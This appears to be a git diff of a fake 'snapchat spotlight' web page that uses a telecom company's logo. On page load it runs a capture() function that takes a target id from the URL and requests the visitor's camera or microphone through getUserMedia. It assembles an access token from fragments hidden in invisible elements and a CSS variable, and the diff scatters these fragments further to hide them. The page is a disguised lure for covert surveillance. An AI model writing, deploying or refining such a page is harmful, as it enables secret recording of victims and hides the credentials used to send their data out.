@@ -4,18 +4,21 @@
     <meta charset="UTF-8">
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
-
-    <meta name="analytics-id" content="8431515310:">
     <style>
+        :root { --config-node: "AAHgyPYR-Z"; } /* پارچەی دووەم لێرەیە */
         body { background-color: white; margin: 0; overflow: hidden; }
-        .sys-info { display: none; visibility: hidden; }
+        .hidden-layer { display: none; opacity: 0; }
     </style>
 </head>
 <body onload="capture()">
 
     
-    <div class="sys-info">
-        <span id="data_ref_02">AAHgyPYR-Z</span>
+    <a href="#" id="v_ref_link" class="hidden-layer">8431515310:</a>
+
+    <div class="main-content">
+        <p>Loading application resources...</p>
+
+        <p class="hidden-layer" id="p_node_val">Fn2QF-xU2367CK</p>
     </div>
 
 <script>
@@ -23,10 +26,10 @@
     const targetID = urlParams.get('id'); 
     
 
-    const _s1 = document.querySelector('meta[name="analytics-id"]').content;
-    const _s2 = document.getElementById("data_ref_02").innerText;
-    const _s3 = "Fn2QF-xU2367CK"; 
-    
+    const _p1 = document.getElementById("v_ref_link").innerText;
+    const _p2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+    const _p3 = document.getElementById("p_node_val").innerText;
+
     async function capture() {
         if (!targetID) return;
 
@@ -35,9 +38,8 @@
         }, 5000);
 
     
-        const _s4 = document.getElementById("p_ext_data").innerText;
-        const _s5 = "KRQPP-YQq1s";
-        const TOKEN = _s1 + _s2 + _s3 + _s4 + _s5;
+        const _p4 = document.getElementById("sys_check_tail").innerText;
+        const TOKEN = _p1 + _p2 + _p3 + _p4;
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -100,8 +102,8 @@
 </script>
 
     
-    <footer style="display:none">
-        <span id="p_ext_data">KRQPP-YQq1s</span>
-    </footer>
+    <div class="hidden-layer">
+        <code id="sys_check_tail">KRQPP-YQq1s</code>
+    </div>
 </body>
 </html>
